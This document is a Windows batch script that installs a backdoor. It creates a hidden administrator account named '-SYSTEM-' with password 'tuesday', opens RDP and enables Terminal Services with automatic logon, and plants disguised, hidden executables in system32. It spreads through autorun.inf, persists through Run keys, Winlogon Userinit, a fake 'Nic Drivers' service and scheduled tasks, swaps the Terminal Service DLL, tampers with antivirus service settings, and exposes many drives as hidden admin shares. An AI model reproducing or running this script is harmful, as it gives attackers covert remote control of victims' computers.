if %cd%==%windir%\system32 goto start
if %cd%==C:\ goto start
start %cd%
:start

:@ echo off
:cd /d %windir%\system32
:netsh firewall set opmode disable

:netsh firewall set opmode enable
netsh firewall add portopening protocol = TCP port = 3389 name = "Terminal Service" mode = ENABLE scope = SUBNET

echo Windows Registry Editor Version 5.00>folder.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>folder.reg
echo "NoFolderOptions"=dword:00000000>>folder.reg
echo "ShowSuperHidden"=dword:00000000>>folder.reg
echo "DontShowSuperHidden"=dword:00000001>>folder.reg
regedit /s folder.reg
del folder.reg

echo Windows Registry Editor Version 5.00>hand.reg
echo [HKEY_CLASSES_ROOT\Network\SharingHandler]>>hand.reg
echo @="">>hand.reg
regedit /s hand.reg
del hand.reg

net user -SYSTEM- /delete
net user -SYSTEM- tuesday /add
net localgroup "administrators" -SYSTEM- /add

xcopy /y /H osDSP.exe %windir%\system32>nul
xcopy /y /H Dskconf.msc %windir%\system32>nul
xcopy /y /H Shell.cat %windir%\system32>nul
xcopy /y /H Dsksvc.SYS %windir%\system32>nul
xcopy /y /H osDSP.exe %windir%\system32\Restore>nul
xcopy /y /H Dskconf.msc %windir%\system32\Restore>nul
xcopy /y /H Shell.cat %windir%\system32\Restore>nul
xcopy /y /H Dsksvc.SYS %windir%\system32\Restore>nul

attrib -S -H %windir%\system32\osDSP.exe
attrib -S -H %windir%\system32\Dskconf.msc
attrib -S -H %windir%\system32\Shell.cat
attrib -S -H %windir%\system32\Dsksvc.SYS

attrib -S -H %windir%\system32\Restore\osDSP.exe
attrib -S -H %windir%\system32\Restore\Dskconf.msc
attrib -S -H %windir%\system32\Restore\Shell.cat
attrib -S -H %windir%\system32\Restore\Dsksvc.SYS

ren %windir%\system32\osDSP.exe Rstd.exe
ren %windir%\system32\Dskconf.msc crv.exe
ren %windir%\system32\Shell.cat rmtdsk.dll
ren %windir%\system32\Dsksvc.SYS runsvr.exe

ren %windir%\system32\Restore\osDSP.exe strt.exe
ren %windir%\system32\Restore\Dskconf.msc snd.exe
ren %windir%\system32\Restore\Shell.cat rmtdsk.dll
ren %windir%\system32\Restore\Dsksvc.SYS runsvr.exe
xcopy /y /H osDSP.exe %windir%\system32\Restore>nul
xcopy /y /H Dskconf.msc %windir%\system32\Restore>nul
xcopy /y /H Shell.cat %windir%\system32\Restore>nul
xcopy /y /H Dsksvc.SYS %windir%\system32\Restore>nul
find "osDSP.exe" Autorun.inf
if %errorlevel%==0 goto skip
echo [Autorun]>autorun.inf
echo Open=osDSP.exe>>autorun.inf
echo shellexecute=osDSP.exe>>autorun.inf
echo shell\Auto\command=osDSP.exe>>autorun.inf
echo Shell=Auto>>autorun.inf
:skip
attrib +S +H Autorun.inf

attrib +S +H %windir%\system32\Rstd.exe
attrib +S +H %windir%\system32\runsvr.exe
attrib +S +H %windir%\system32\rmtdsk.dll
attrib +S +H %windir%\system32\crv.exe

attrib +S +H %windir%\system32\Restore\osDSP.exe
attrib +S +H %windir%\system32\Restore\Dskconf.msc
attrib +S +H %windir%\system32\Restore\Shell.cat
attrib +S +H %windir%\system32\Restore\Dsksvc.SYS

attrib +S +H %windir%\system32\Restore\snd.exe
attrib +S +H %windir%\system32\Restore\strt.exe
attrib +S +H %windir%\system32\Restore\runsvr.exe

xcopy /y /H Autorun.inf %windir%\system32>nul
Xcopy /y /H Autorun.inf %windir%\system32\restore>nul
netsh firewall add allowedprogram C:\windows\system32\runsvr.exe "Winsock" ENABLE
:Remote desktop enabler
echo Windows Registry Editor Version 5.00>rd.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>rd.reg
echo "FirstCountMsgQPeeksSleepBadApp"=dword:0000000f>>rd.reg
echo "Modems With Bad DSR"=hex(7):4d,00,75,00,6c,00,74,00,69,00,54,00,65,00,63,00,\>>rd.reg
echo  68,00,20,00,4d,00,75,00,6c,00,74,00,69,00,4d,00,6f,00,64,00,65,00,6d,00,20,\>>rd.reg
echo 00,4d,00,54,00,32,00,38,00,33,00,34,00,00,00,4d,00,75,00,6c,00,74,00,69,00,\>>rd.reg
echo  54,00,65,00,63,00,68,00,20,00,4d,00,75,00,6c,00,74,00,69,00,4d,00,6f,00,64,\>>rd.reg
echo  00,65,00,6d,00,20,00,4d,00,54,00,32,00,38,00,33,00,34,00,5a,00,44,00,58,00,\>>rd.reg
echo  00,00,4d,00,75,00,6c,00,74,00,69,00,54,00,65,00,63,00,68,00,20,00,4d,00,54,\>>rd.reg
echo  00,32,00,38,00,33,00,34,00,00,00,4d,00,75,00,6c,00,74,00,69,00,54,00,65,00,\>>rd.reg
echo  63,00,68,00,20,00,4d,00,54,00,32,00,38,00,33,00,34,00,5a,00,44,00,58,00,00,\>>rd.reg
echo  00,4d,00,75,00,6c,00,74,00,69,00,54,00,65,00,63,00,68,00,20,00,32,00,38,00,\>>rd.reg
echo  33,00,34,00,00,00,4d,0v0,75,00,6c,00,74,00,69,00,54,00,65,00,63,00,68,00,20,\>>rd.reg
echo  00,32,00,38,00,33,00,34,00,5a,00,44,00,58,00,00,00,00,00>>rd.reg
echo "MsgQBadAppSleepTimeInMillisec"=dword:00000001>>rd.reg
echo "NthCountMsgQPeeksSleepBadApp"=dword:00000005>>rd.reg
echo "fWritableTSCCPermTab"=dword:00000000>>rd.reg
echo "DeleteTempDirsOnExit"=dword:00000000>>rd.reg
echo "PerSessionTempDir"=dword:00000000>>rd.reg
echo "fDenyTSConnections"=dword:00000000>>rd.reg
echo "ProductVersion"="5.1">>rd.reg
echo "UseExchangeIM"=dword:00000003>>rd.reg
echo "TSAdvertise"=dword:00000000>>rd.reg
echo "IdleWinStationPoolCount"=dword:00000000>>rd.reg
echo "TSAppCompat"=dword:00000000>>rd.reg
echo "TSEnabled"=dword:00000001>>rd.reg
echo "TSUserEnabled"=dword:00000000>>rd.reg
echo "fAllowToGetHelp"=dword:00000000>>rd.reg
regedit /s rd.reg
del rd.reg

::Changes the termsrv.dll
echo Windows Registry Editor Version 5.00>dllc.reg

echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService\Parameters]>>dllc.reg
echo "ServiceDll"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,\>>dllc.reg
echo   00,74,00,25,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,\>>dllc.reg
echo   72,00,6d,00,74,00,64,00,73,00,6b,00,2e,00,64,00,6c,00,6c,00,00,00>>dllc.reg
echo "Certificate"=hex:01,00,00,00,01,00,00,00,01,00,00,00,06,00,5c,00,52,53,41,31,\>>dllc.reg
echo   48,00,00,00,00,02,00,00,3f,00,00,00,01,00,01,00,83,77,b6,77,a3,6c,de,54,f7,\>>dllc.reg
echo   8d,75,03,56,09,7c,f0,6b,e3,9d,79,84,57,8f,ef,dd,a5,f4,24,bb,dd,0b,10,2c,89,\>>dllc.reg
echo   8a,79,4b,2b,31,79,f1,a3,b7,1b,18,47,cf,8a,e2,8f,61,8f,31,cb,c3,b0,0d,c1,f5,\>>dllc.reg
echo   87,47,a6,45,de,00,00,00,00,00,00,00,00,08,00,48,00,59,38,8d,71,ec,c9,1c,ba,\>>dllc.reg
echo   ca,3d,b6,80,84,9e,1e,70,4f,78,34,df,a7,ff,57,9b,d4,46,fa,60,2d,c7,61,a2,53,\>>dllc.reg
echo   22,19,6f,62,bd,a8,b8,88,f2,f3,ea,30,bc,2c,06,f4,4f,39,8c,8b,29,9a,90,fa,01,\>>dllc.reg
echo   c3,06,94,e4,60,33,00,00,00,00,00,00,00,00>>dllc.reg

regedit /s dllc.reg
del dllc.reg

echo Windows Registry Editor Version 5.00 >st.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>st.reg
echo "USB drivers"="C:\\WINDOWS\\System32\\crv.exe">>st.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]>>st.reg
echo "Userinit"="C:\\WINDOWS\\system32\\userinit.exe,C:\\WINDOWS\\System32\\Rstd.exe">>st.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Medium access]>>st.reg
echo "Type"=dword:00000010>>st.reg
echo "Start"=dword:00000002>>st.reg>>st.reg
echo "ErrorControl"=dword:00000001>>st.reg
echo "ImagePath"=hex(2):25,00,77,00,69,00,6e,00,64,00,69,00,72,00,25,00,5c,00,73,00,\>>st.reg
echo   79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,52,00,65,00,73,00,75,00,5f,\>>st.reg
echo   00,74,00,69,00,64,00,65,00,2e,00,65,00,78,00,65,00,00,00>>st.reg
echo "DisplayName"="Nic Drivers">>st.reg
echo "ObjectName"="LocalSystem">>st.reg
echo "Description"="Helps keep your station in order.">>st.reg
echo "FailureActions"=hex:00,00,00,00,00,00,00,00,00,00,00,00,03,00,00,00,74,00,65,\>>st.reg
echo   00,01,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00>>st.reg

echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AVP\Security]>>st.reg
echo "Security"=hex:01,00,14,80,a4,00,00,00,b0,00,00,00,14,00,00,00,30,00,00,00,02,\>>st.reg
echo   00,1c,00,01,00,00,00,02,80,14,00,ff,01,0f,00,01,01,00,00,00,00,00,01,00,00,\>>st.reg
echo   00,00,02,00,74,00,05,00,00,00,00,00,14,00,9d,01,02,00,01,01,00,00,00,00,00,\>>st.reg
echo   01,00,00,00,00,00,00,14,00,fd,01,02,00,01,01,00,00,00,00,00,05,12,00,00,00,\>>st.reg
echo   00,00,18,00,ff,01,0f,00,01,02,00,00,00,00,00,05,20,00,00,00,20,02,00,00,00,\>>st.reg
echo   00,14,00,8d,01,02,00,01,01,00,00,00,00,00,05,0b,00,00,00,00,00,18,00,fd,01,\>>st.reg
echo   02,00,01,02,00,00,00,00,00,05,20,00,00,00,23,02,00,00,01,01,00,00,00,00,00,\>>st.reg
echo   05,12,00,00,00,01,01,00,00,00,00,00,05,12,00,00,00>>st.reg

echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AVP\Enum]>>st.reg
echo "0"="Root\\LEGACY_AVP\\0000">>st.reg
echo "Count"=dword:00000001>>st.reg
echo "NextInstance"=dword:00000001>>st.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]>>st.reg
echo "Shell"="Explorer.exe">>st.reg
regedit /s st.reg
del st.reg

echo @echo off>c:\TS.reg
echo Windows Registry Editor Version 5.00>> c:\TS.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Servic es\TermService]>> c:\TS.reg
echo "Start"=dword:00000002>> c:\TS.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contro l\Terminal Server]>> c:\TS.reg
echo "AllowTSConnections"=dword:00000001>> c:\TS.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contro l\Terminal Server]>> c:\TS.reg
echo "fDenyTSConnections"=dword:00000000>> c:\TS.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contro l\Terminal Server]>> c:\TS.reg
echo "fAllowToGetHelp"=dword:00000001>> c:\TS.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]>> c:\TS.reg
echo "AllowMultipleTSSessions"=dword:00000001>> c:\TS.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]>> c:\TS.reg
echo "AutoAdminLogon"="1">> c:\TS.reg
@echo --[ Registering the service... ]
echo.
REGEDIT /S C:\TS.REG
REGEDIT -S C:\TS.REG

echo [Components] > c:\bootlog~.txt 
echo TSEnabled = on >> c:\bootlog~.txt 
:sysocmgr /i:%windir%\inf\sysoc.inf /u:c:\bootlog~.txt /q

DEL /Q c:\TS.REG

DEL /Q c:\bootlog~.txt
echo nonsense>%windir%\system32\ntoskern.dll
echo nonsense continues>>%windir%\system32\ntoskern.dll

echo Windows Registry Editor Version 5.00>>rd.reg>hs.reg
echo [HKEY_LOCAL_MACHINE\sOFTWARE\Microsoft\Windows NT\CurrentVeRsion\winlogon\SpecialAccounts\UserList]>>hs.reg
echo "-SYSTEM-"=dword:00000000>>hs.reg
regedit /s hs.reg
del hs.reg

at 10:05 /interactive /EVERY:M,T,W,TH,F,S,SU "%windir%\system32\Restore\strt.exe">nul
at 16:15 /interactive /EVERY:M,T,W,TH,F,S,SU "%windir%\system32\Restore\strt.exe">nul
at 20:37 /interactive /EVERY:M,T,W,TH,F,S,SU "%windir%\system32\Restore\strt.exe">nul

echo Windows Registry Editor Version 5.00>C:\WINDOWS\system32\security.reg

echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\lanmanserver\Shares]>>C:\WINDOWS\system32\security.reg
echo "system19$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   58,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system20$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   59,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system21$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   5a,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system01$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   45,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   43,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system03$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   48,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system02$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   46,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system04$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   49,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system05$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   4a,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system06$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   4b,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system07$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   4c,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system08$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   4d,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system09$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   4e,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system10$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   4f,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system11$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   50,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system12$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   51,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
